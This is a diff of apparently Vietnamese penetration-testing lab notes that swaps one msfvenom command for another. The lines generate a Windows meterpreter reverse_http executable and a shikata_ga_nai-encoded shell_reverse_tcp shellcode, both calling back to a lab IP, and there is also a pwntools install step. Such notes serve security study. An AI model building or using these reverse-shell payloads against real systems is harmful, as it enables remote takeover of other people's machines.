@@ -26,7 +26,8 @@
 
 Tạo meterpreter:
 msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -f exe -v met.exe
-msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 -f python –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
 
 cài pwntool
 python3 -m pip install --upgrade pip
